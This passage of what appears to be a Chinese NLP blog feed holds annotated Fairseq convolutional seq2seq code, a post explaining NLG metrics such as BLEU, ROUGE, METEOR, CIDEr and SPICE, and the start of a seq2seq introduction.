class="hljs-keyword">for</span> _, (out_channels, kernel_size, residual) <span class="hljs-keyword">in</span> enumerate(convolutions):<br>            <span class="hljs-keyword">if</span> residual == <span class="hljs-number">0</span>:<br>                residual_dim = out_channels<br>            <span class="hljs-keyword">else</span>:<br>                residual_dim = layer_in_channels[-residual]<br>            self.projections.append(Linear(residual_dim, out_channels)<br>                                    <span class="hljs-keyword">if</span> residual_dim != out_channels <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>)<br>            <span class="hljs-keyword">if</span> kernel_size % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>                padding = kernel_size // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                padding = <span class="hljs-number">0</span><br>            self.convolutions.append(<br>                ConvTBC(in_channels, out_channels * <span class="hljs-number">2</span>, kernel_size,<br>                        dropout=dropout, padding=padding)<br>            )<br>            self.residuals.append(residual)<br>            in_channels = out_channels<br>            layer_in_channels.append(out_channels)<br>        self.fc2 = Linear(in_channels, embed_dim)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forward</span><span class="hljs-params">(self, src_tokens, src_lengths)</span>:</span><br>        <span class="hljs-comment"># 查找词向量及位置向量</span><br>        x = self.embed_tokens(src_tokens) + self.embed_positions(src_tokens)<br>        x = F.dropout(x, p=self.dropout, training=self.training)<br>        input_embedding = x<br><br>        <span class="hljs-comment"># 将词的表达映射到CNN的输入空间 fc1: R^f -&gt;R^d</span><br>        x = self.fc1(x)<br><br>        <span class="hljs-comment"># 在句子左右两边添加padding</span><br>        encoder_padding_mask = src_tokens.eq(self.padding_idx).t()  <span class="hljs-comment"># -&gt; T x B</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> encoder_padding_mask.any():<br>            encoder_padding_mask = <span class="hljs-literal">None</span><br><br>        <span class="hljs-comment"># 转置：B x T x C -&gt; T x B x C</span><br>        x = x.transpose(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br><br>        residuals = [x]<br>        <span class="hljs-comment"># 多层的CNN 层叠起来</span><br>        <span class="hljs-keyword">for</span> proj, conv, res_layer <span class="hljs-keyword">in</span> zip(self.projections, self.convolutions, self.residuals):<br>            <span class="hljs-keyword">if</span> res_layer &gt; <span class="hljs-number">0</span>:<br>                residual = residuals[-res_layer]<br>                residual = residual <span class="hljs-keyword">if</span> proj <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> proj(residual)<br>            <span class="hljs-keyword">else</span>:<br>                residual = <span class="hljs-literal">None</span><br><br>            <span class="hljs-keyword">if</span> encoder_padding_mask <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                x = x.masked_fill(encoder_padding_mask.unsqueeze(<span class="hljs-number">-1</span>), <span class="hljs-number">0</span>)<br><br>            x = F.dropout(x, p=self.dropout, training=self.training)<br>            <span class="hljs-keyword">if</span> conv.kernel_size[<span class="hljs-number">0</span>] % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>                <span class="hljs-comment"># padding is implicit in the conv</span><br>                x = conv(x)<br>            <span class="hljs-keyword">else</span>:<br>                padding_l = (conv.kernel_size[<span class="hljs-number">0</span>] - <span class="hljs-number">1</span>) // <span class="hljs-number">2</span><br>                padding_r = conv.kernel_size[<span class="hljs-number">0</span>] // <span class="hljs-number">2</span><br>                x = F.pad(x, (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, padding_l, padding_r))<br>                x = conv(x)<br>            <span class="hljs-comment"># GLU 层</span><br>            x = F.glu(x, dim=<span class="hljs-number">2</span>)<br>            <br>            <span class="hljs-comment"># 残差层</span><br>            <span class="hljs-keyword">if</span> residual <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                x = (x + residual) * math.sqrt(<span class="hljs-number">0.5</span>)<br>            residuals.append(x)<br><br>        <span class="hljs-comment"># T x B x C -&gt; B x T x C</span><br>        x = x.transpose(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>)<br><br>        <span class="hljs-comment"># 将x映射回词向量空间 R^d -&gt; R^f</span><br>        x = self.fc2(x)<br><br>        <span class="hljs-keyword">if</span> encoder_padding_mask <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            encoder_padding_mask = encoder_padding_mask.t()  <span class="hljs-comment"># -&gt; B x T</span><br>            x = x.masked_fill(encoder_padding_mask.unsqueeze(<span class="hljs-number">-1</span>), <span class="hljs-number">0</span>)<br><br>        <span class="hljs-comment"># 将gradient放大</span><br>        x = GradMultiply.apply(x, <span class="hljs-number">1.0</span> / (<span class="hljs-number">2.0</span> * self.num_attention_layers))<br><br>        <span class="hljs-comment"># 把input embedding加到output中</span><br>        y = (x + input_embedding) * math.sqrt(<span class="hljs-number">0.5</span>)<br><br>        <span class="hljs-keyword">return</span> &#123;<br>            <span class="hljs-string">'encoder_out'</span>: (x, y),<br>            <span class="hljs-string">'encoder_padding_mask'</span>: encoder_padding_mask,  <span class="hljs-comment"># B x T</span><br>        &#125;<br></code></pre></div></td></tr></table></figure><ul><li>解码器decoder</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FConvDecoder</span><span class="hljs-params">(FairseqIncrementalDecoder)</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,...)</span>:</span><br><br>        <span class="hljs-comment"># 定义词向量矩阵及位置向量矩阵</span><br>        self.embed_tokens = Embedding(num_embeddings, embed_dim, padding_idx)<br>        self.embed_positions = PositionalEmbedding(<br>            max_positions,<br>            embed_dim,<br>            padding_idx,<br>            left_pad=self.left_pad,<br>        ) <span class="hljs-keyword">if</span> positional_embeddings <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <br>        convolutions = extend_conv_spec(convolutions)<br>        in_channels = convolutions[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]<br>        <br>        self.fc1 = Linear(embed_dim, in_channels, dropout=dropout)<br>        self.projections = nn.ModuleList()<br>        self.convolutions = nn.ModuleList()<br>        self.attention = nn.ModuleList()<br>        self.residuals = []<br>        <br>        <span class="hljs-comment"># 定义多层CNN</span><br>        layer_in_channels = [in_channels]<br>        <span class="hljs-keyword">for</span> i, (out_channels, kernel_size, residual) <span class="hljs-keyword">in</span> enumerate(convolutions):<br>            <span class="hljs-keyword">if</span> residual == <span class="hljs-number">0</span>:<br>                residual_dim = out_channels<br>            <span class="hljs-keyword">else</span>:<br>                residual_dim = layer_in_channels[-residual]<br>            self.projections.append(Linear(residual_dim, out_channels)<br>                                    <span class="hljs-keyword">if</span> residual_dim != out_channels <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>)<br>            self.convolutions.append(<br>                LinearizedConv1d(in_channels, out_channels * <span class="hljs-number">2</span>, kernel_size,<br>                                 padding=(kernel_size - <span class="hljs-number">1</span>), dropout=dropout)<br>            )<br>            self.attention.append(AttentionLayer(out_channels, embed_dim)<br>                                  <span class="hljs-keyword">if</span> attention[i] <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>)<br>            self.residuals.append(residual)<br>            in_channels = out_channels<br>            layer_in_channels.append(out_channels)<br><br>        self.adaptive_softmax = <span class="hljs-literal">None</span><br>        self.fc2 = self.fc3 = <span class="hljs-literal">None</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forward</span><span class="hljs-params">(self, prev_output_tokens, encoder_out_dict=None, incremental_state=None)</span>:</span><br>        ...<br>        <span class="hljs-comment"># 获得位置向量</span><br>        <span class="hljs-keyword">if</span> self.embed_positions <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            pos_embed = self.embed_positions(prev_output_tokens, incremental_state)<br>        <span class="hljs-keyword">else</span>:<br>            pos_embed = <span class="hljs-number">0</span><br><br>        <span class="hljs-comment"># 获得上一个生成的单词的词向量</span><br>        x = self._embed_tokens(prev_output_tokens, incremental_state)<br><br>        <span class="hljs-comment"># 将词向量加上位置向量作为当前时刻的输入</span><br>        x += pos_embed<br>        x = F.dropout(x, p=self.dropout, training=self.training)<br>        target_embedding = x<br><br>        <span class="hljs-comment"># 将输入从词向量空间映射到CNN输入空间</span><br>        x = self.fc1(x)<br><br>        <span class="hljs-comment"># 转置：B x T x C -&gt; T x B x C</span><br>        x = self._transpose_if_training(x, incremental_state)<br><br>        <span class="hljs-comment"># 多层的CNN 堆叠</span><br>        avg_attn_scores = <span class="hljs-literal">None</span><br>        num_attn_layers = len(self.attention)<br>        residuals = [x]<br>        <span class="hljs-keyword">for</span> proj, conv, attention, res_layer <span class="hljs-keyword">in</span> zip(self.projections, self.convolutions, self.attention,<br>                                                    self.residuals):<br>            <span class="hljs-keyword">if</span> res_layer &gt; <span class="hljs-number">0</span>:<br>                residual = residuals[-res_layer]<br>                residual = residual <span class="hljs-keyword">if</span> proj <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> proj(residual)<br>            <span class="hljs-keyword">else</span>:<br>                residual = <span class="hljs-literal">None</span><br><br>            x = F.dropout(x, p=self.dropout, training=self.training)<br>            x = conv(x, incremental_state)<br>            x = F.glu(x, dim=<span class="hljs-number">2</span>)<br><br>            <span class="hljs-comment"># 注意力机制</span><br>            <span class="hljs-keyword">if</span> attention <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                x = self._transpose_if_training(x, incremental_state)<br><br>                x, attn_scores = attention(x, target_embedding, (encoder_a, encoder_b), encoder_padding_mask)<br><br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.training <span class="hljs-keyword">and</span> self.need_attn:<br>                    attn_scores = attn_scores / num_attn_layers<br>                    <span class="hljs-keyword">if</span> avg_attn_scores <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                        avg_attn_scores = attn_scores<br>                    <span class="hljs-keyword">else</span>:<br>                        avg_attn_scores.add_(attn_scores)<br><br>                x = self._transpose_if_training(x, incremental_state)<br><br>            <span class="hljs-comment"># 残差连接</span><br>            <span class="hljs-keyword">if</span> residual <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                x = (x + residual) * math.sqrt(<span class="hljs-number">0.5</span>)<br>            residuals.append(x)<br><br>        <span class="hljs-comment"># 转置：T x B x C -&gt; B x T x C</span><br>        x = self._transpose_if_training(x, incremental_state)<br><br>        <span class="hljs-comment"># fc2:将输入映射到词表大小空间，可进行预测</span><br>        <span class="hljs-keyword">if</span> self.fc2 <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> self.fc3 <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            x = self.fc2(x)<br>            x = F.dropout(x, p=self.dropout, training=self.training)<br>            x = self.fc3(x)<br><br>        <span class="hljs-keyword">return</span> x, avg_attn_scores<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(args, init_distributed=False)</span>:</span><br>    ...<br><br>    <span class="hljs-comment"># 载入数据</span><br>    load_dataset_splits(task, [<span class="hljs-string">'train'</span>, <span class="hljs-string">'valid'</span>])<br><br>    <span class="hljs-comment"># 构建模型及优化函数</span><br>    model = task.build_model(args)<br>    criterion = task.build_criterion(args)<br><br>    <span class="hljs-comment"># 构建训练器 trainer</span><br>    trainer = Trainer(args, task, model, criterion, dummy_batch, oom_batch)<br><br>    <span class="hljs-comment"># 初始化dataloader</span><br>    epoch_itr = task.get_batch_iterator(...)<br><br>    <span class="hljs-comment"># 训练一直到learning rate太小就停止</span><br>    max_epoch = args.max_epoch <span class="hljs-keyword">or</span> math.inf<br>    max_update = args.max_update <span class="hljs-keyword">or</span> math.inf<br>    lr = trainer.get_lr()<br>    train_meter = StopwatchMeter()<br>    train_meter.start()<br>    <span class="hljs-keyword">while</span> lr &gt; args.min_lr <span class="hljs-keyword">and</span> epoch_itr.epoch &lt; max_epoch <span class="hljs-keyword">and</span> trainer.get_num_updates() &lt; max_update:<br>        <span class="hljs-comment"># 训练一个epoch</span><br>        train(args, trainer, task, epoch_itr)<br><br>        <span class="hljs-keyword">if</span> epoch_itr.epoch % args.validate_interval == <span class="hljs-number">0</span>:<br>            valid_losses = validate(args, trainer, task, epoch_itr, valid_subsets)<br><br>        <span class="hljs-comment"># 只用第一个validation loss去更新learning rate</span><br>        lr = trainer.lr_step(epoch_itr.epoch, valid_losses[<span class="hljs-number">0</span>])<br><br>        <span class="hljs-comment"># 保存模型</span><br>        <span class="hljs-keyword">if</span> epoch_itr.epoch % args.save_interval == <span class="hljs-number">0</span>:<br>            save_checkpoint(args, trainer, epoch_itr, valid_losses[<span class="hljs-number">0</span>])<br>    train_meter.stop()<br></code></pre></div></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cnn </tag>
            
            <tag> Fairseq </tag>
            
            <tag> seq2seq </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NLG常用评价指标</title>
      <link href="/posts/cd85a6be.html"/>
      <url>/posts/cd85a6be.html</url>
      
        <content type="html"><![CDATA[<h1><span id="nlg常用评价指标">NLG常用评价指标</span></h1><p>客观评价指标 – BLEU – ROUGE – METEOR – CIDEr</p><p>主观评价指标 – 流畅度 – 相关性 – 助盲性</p><p>这些指标原先都是用来度量机器翻译结果质量的，并且被证明可以很好的反应待评测翻译结果的准确性，并且与人类对待评测翻译结果的评价存在强相关</p><hr><h3><span id="bleu">BLEU</span></h3><p><a href="https://aclanthology.info/pdf/P/P02/P02-1040.pdf">文献</a></p><blockquote><p>只看中准确率的指标，就是说更加关心候选译文里的多少 n-gram是对的（即在参考译文里出现了），而不在乎召回率（参考译文里有哪些 n-gram在候选译文中没出现）</p><p>基于准确率，BLEU 得分越高越好</p></blockquote><p>BLEU是最早提出的机器翻译评价指标，是所有文本评价指标的源头。BLEU的全名为：bilingualevaluation understudy，即：双语互译质量评估辅助工具。</p><p>BLEU 的大意是比较候选译文和参考译文里的 n-gram（实践中从 unigram 取到4-gram） 重合程度，重合程度越高就认为译文质量越高。选不同长度的 n-gram是因为，unigram 的准确率可以用于衡量单词翻译的准确性，更高阶的 n-gram的准确率可以用来衡量句子的流畅性。</p><p>BLEU 原论文建议大家的测试集里给每个句子配备 4条参考译文，这样就可以减小语言多样性带来的影响（然而现在很多机器翻译的测试集都是只有1 条译文，尴尬= =）</p><p>brevity penalty来惩罚候选译文过短的情况（候选译文过短在机器翻译中往往意味着漏翻，也就是低召回率）</p><p>现在还是普遍认为 BLEU 指标偏向于较短的翻译结果（brevity penalty没有想象中那么强）</p><p>优点很明显：方便、快速、结果有参考价值 　</p><p>缺点也不少，主要有：</p><ul><li>不考虑语言表达（语法）上的准确性；</li><li>测评精度会受常用词的干扰；</li><li>短译句的测评精度有时会较高；</li><li>没有考虑同义词或相似表达的情况，可能会导致合理翻译被否定；</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> nltk.translate.bleu_score <span class="hljs-keyword">import</span> sentence_bleu<br><br>reference = [[<span class="hljs-string">'this'</span>, <span class="hljs-string">'is'</span>, <span class="hljs-string">'a'</span>, <span class="hljs-string">'test'</span>], [<span class="hljs-string">'this'</span>, <span class="hljs-string">'is'</span> <span class="hljs-string">'test'</span>]]<br>candidate = [<span class="hljs-string">'this'</span>, <span class="hljs-string">'is'</span>, <span class="hljs-string">'a'</span>, <span class="hljs-string">'test'</span>]<br><br>score = sentence_bleu(reference, candidate)<br>print(score)<br></code></pre></div></td></tr></table></figure><p>只能做到个大概判断，它的目标也只是给出一个快且不差自动评估解决方案</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/NLG任务评价指标_pic/image-20200707135951108.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><ul><li>Hk(Ci) 表示Wk翻译选译文Ci中出现的次数，</li><li>Hk(Sij) 表示Wk在标准答案Sij中出现的次数，</li><li>maxi∈mhk(sij)表示某n-gram在多条标准答案中出现最多的次数，</li><li>∑i∑kmin(hk(ci),maxj∈mhk(sij))表示取n-gram在翻译译文和标准答案中出现的最小次数。</li></ul><p><strong>i为candidate的index</strong>；<strong>j为reference的index</strong>；<strong>k为n-gram的index</strong></p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/NLG任务评价指标_pic/image-20200707140257831.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><hr><h3><span id="rouge">ROUGE</span></h3><p><a href="http://www.aclweb.org/anthology/W04-1013" target="_blank" rel="noopener">文献</a></p><blockquote><p>ROUGE 和 BLEU 几乎一模一样，区别是 BLEU 计算准确率，而 ROUGE计算召回率。</p></blockquote><p>在SMT（统计机器翻译）时代，机器翻译效果稀烂，需要同时评价翻译的准确度和流畅度；等到NMT（神经网络机器翻译）出来以后，神经网络脑补能力极强，翻译出的结果都是通顺的，但是有时候容易瞎翻译，遗漏翻译</p><p>不看流畅度只看召回率（参考译文里的 n-gram有多少出现在了候选译文中）就好了，这样就能知道 NMT系统到底有没有漏翻（这会导致低召回率）。</p><blockquote><p>所以，ROUGE 适合评价 NMT，而不适用于SMT，因为它不管候选译文流不流畅。</p></blockquote><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/NLG任务评价指标_pic/image-20200707140642773.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>分母是n-gram的个数，分子是参考摘要和自动摘要共有的n-gram的个数。ROUGE得分越高越好</p><blockquote><p>召回率是针对我们原来的样本而言的，它表示的是样本中的正例有多少被预测正确了。那也有两种可能，一种是把原来的正类预测成正类(TP)，另一种就是把原来的正类预测为负类(FN)</p><p>精确率是针对我们预测结果而言的，它表示的是预测为正的样本中有多少是对的。那么预测为正就有两种可能了，一种就是把正类预测为正类(TP)，另一种就是把负类预测为正类(FP)</p></blockquote><p>Rough-L: L即是LCS(longest commonsubsequence，最长公共子序列)的首字母，因为Rough-L使用了最长公共子序列。</p><hr><h3><span id="meteor">METEOR</span></h3><p><a href="http://www.aclweb.org/anthology/W05-0909" target="_blank" rel="noopener">文献</a></p><p>METEOR大意是说有时候翻译模型翻译的结果是对的，只是碰巧跟参考译文没对上（比如用了一个同义词），于是用WordNet等知识源扩充了一下同义词集，同时考虑了单词的词形（词干相同的词也认为是部分匹配的，也应该给予一定的奖励，比如说把likes 翻译成了 like</p><p>在评价句子流畅性的时候，用了 chunk的概念（候选译文和参考译文能够对齐的、空间排列上连续的单词形成一个chunk，这个对齐算法是一个有点复杂的启发式 beam serach），chunk的数目越少意味着每个 chunk的平均长度越长，也就是说候选译文和参考译文的语序越一致</p><p>缺点：</p><ul><li>有四个超参数 alpha, beta, gamma,delta，这些都是对着某个数据集调出来的（让算法的结果和人的主观评价尽可能一致，方法我记得是grid search），参数一多听起来就不靠谱.</li><li>另外需要有外部知识源（WordNet 等）来进行单词对齐，所以对于 WordNet中不包含的语言，就没法用 METEOR 来评价了。</li></ul><p>使用 WordNet计算特定的序列匹配，同义词，词根和词缀，释义之间的匹配关系，改善了BLEU的效果，使其跟人工判别共更强的相关性。</p><p>同时考虑了准确率和召回率，METEOR 得分越高越好</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/NLG任务评价指标_pic/image-20200707141607255.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><hr><h3><span id="cider">CIDEr</span></h3><p><a href="https://www.cv-foundation.org/openaccess/content_cvpr_2015/papers/Vedantam_CIDEr_Consensus-Based_Image_2015_CVPR_paper.pdf">文献</a></p><p>Consensus-based image descriptionevaluation，通过度量待评测语句与其他大部分人工描述之间的相似性来评价。</p><blockquote><p>这个指标的motivation之一是刚才提到的BLEU的一个缺点，就是对所有匹配上的词都同等对待，而实际上有些词应该更加重要。</p></blockquote><p>CIDEr-D 是修改版本，为的是让 CIDEr 对于 gaming 问题更加鲁棒。什么是Gaming问题？它是一种现象，就是一个句子经过人工判断得分很低，但是在自动计算标准中却得分很高的情况。为了避免这种情况，CIDEr-D增加了截断（clipping）和基于长度的高斯惩罚</p><p>CIDEr 是 BLEU 和向量空间模型的结合。它把每个句子看成文档，然后计算<strong>TF-IDF</strong> 向量（只不过 term 是 n-gram而不是单词）的余弦夹角，据此得到候选句子和参考句子的相似度，同样是不同长度的n-gram 相似度取平均得到最终结果。优点是不同的 n-gram 随着 TF-IDF的不同而有不同的权重，因为整个语料里更常见的 n-gram包含了更小的信息量。</p><hr><h3><span id="spice">SPICE</span></h3><p><a href="https://link.springer.com/chapter/10.1007/978-3-319-46454-1_24">SPICE</a></p><p>SPICE 是专门设计出来用于 image caption 问题的。全称是 SemanticPropositional Image Caption Evaluation。前面四个方法都是基于 n-gram计算的，SPICE 则不是。</p><p>SPICE 使用基于图的语义表示来编码 caption 中的 objects, attributes 和relationships。它先将待评价 caption 和参考 captions 用 ProbabilisticContext-Free Grammar (PCFG) dependency parser parse 成 syntacticdependencies trees，然后用基于规则的方法把 dependency tree 映射成 scenegraphs。最后计算待评价的 caption 中 objects, attributes 和 relationships的 F-score 值。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/NLG任务评价指标_pic/image-20200707142452030.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><hr><h3><span id="翻译和图像描述的区别">翻译和图像描述的区别</span></h3><p>在机器翻译中，译文应该忠实于原文，所以同一句话的多条译文应该互为转述，包含同样的信息；而同一幅图的多条字幕则不一定互为转述，因为不同的字幕可以包含不同数量的图像细节，不管描述得比较详细还是比较粗糙都是正确的字幕。</p><h2><span id="简单总结">简单总结</span></h2><p>NLG常用metrics：</p><ul><li>BLEU: ngram precision；长度类似</li><li>ROUGE: ngram recall</li><li>NIST/CIDEr: 降低频繁词的权重</li><li>METEOR: 考虑同义词的F score；鼓励连续词匹配</li><li>SPICE：匹配语法树与图像特征的F1</li></ul><p>其他：</p><ul><li>STM: 匹配语法树子树</li><li>TER: 编辑的距离</li><li>TERp: TER+同义替换</li></ul><p><a href="https://github.com/Maluuba/nlg-eval">常用评测指标的开源实现</a></p><p><a href="https://github.com/tylin/coco-caption" target="_blank" rel="noopener">MS COCO CaptionEvaluation</a></p><p><a href="https://gist.github.com/kracwarlock/c979b10433fe4ac9fb97">COCOdemo</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bleu </tag>
            
            <tag> rouge </tag>
            
            <tag> evaluation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>seq2seq</title>
      <link href="/posts/ef7a7a35.html"/>
      <url>/posts/ef7a7a35.html</url>
      
        <content type="html"><![CDATA[<h1><span id="seq2seq">seq2seq</span></h1><h2><span id="1seq2seq序列到序列模型简介">1.seq2seq（序列到序列模型）简介</span></h2><p>​对于很多自然语言处理任务，比如<strong>聊天机器人，机器翻译，自动文摘，智能问答</strong>等，传统的解决方案都是<strong>检索式</strong>，这对素材的完善程度要求很高，随着深度学习的发展，研究界将深度学习技术应用与自然语言的生成和自然语言的理解的方面的研究，并取得了一些突破性的成果，比如，Sequence-to-sequence(seq2seq)模型，该技术突破了传统的固定大小输入问题框架，将经典深度神经网络模型运用于翻译与职能问答这一类序列型任务，并在各主流语言之间的相互翻译以及语音助手中人机短问答的应用。</p><p>参考资料:<a href="https://jalammar.github.io/visualizing-neural-machine-translation-mechanics-of-seq2seq-models-with-attention/">VisualizingA Neural Machine Translation Model</a></p><h2><span id="2编码解码模型">2.编码解码模型</span></h2><p>​seq2seq模型不仅仅是用在NLP中的模型，它的输入也可以是语音信号或者图像表示。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/img/%5B1%5D_seq2seq_1.gif" srcset="/img/loading.gif" lazyload></p><p>​在NLP的任务中，其实输入的是文本序列，输出的很多时候也是文本序列。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/img/%5B2%5D_seq2seq_2.gif" srcset="/img/loading.gif" lazyload></p><p>​这是一个“编码解码器”结构，编码器处理输入序列中的每个元素(在这里可能是1个词)，将捕获的信息编译成向量（称为上下文内容向量）。在处理整个输入序列之后，编码器将上下文发送到解码器，解码器逐项开始产生输出序列。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/img/%5B3%5D_seq2seq_3.gif" srcset="/img/loading.gif" lazyload></p><p>​ 在机器翻译的场景下，是下面这样的。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/img/%5B4%5D_seq2seq_4.gif" srcset="/img/loading.gif" lazyload></p><p>​ 上下文向量其实就是</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/img/context.png" srcset="/img/loading.gif" lazyload></p><p>​ 输入的数据(文本序列)中的每个元素(词)被编码成一个稠密的向量wordembedding</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/img/embedding_seq2seq.png" srcset="/img/loading.gif" lazyload></p><p>​encoder和decoder一般为循环神经网络(RNN)，循环神经网络会接受每个位置(时间点)上的输入，同时经过处理进行信息融合，并可能会在某些位置(时间点)上输出。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/img/%5B5%5D_RNN_1.gif" srcset="/img/loading.gif" lazyload></p><p>​ 所以动态地展示整个编码器和解码器。</p><p><img 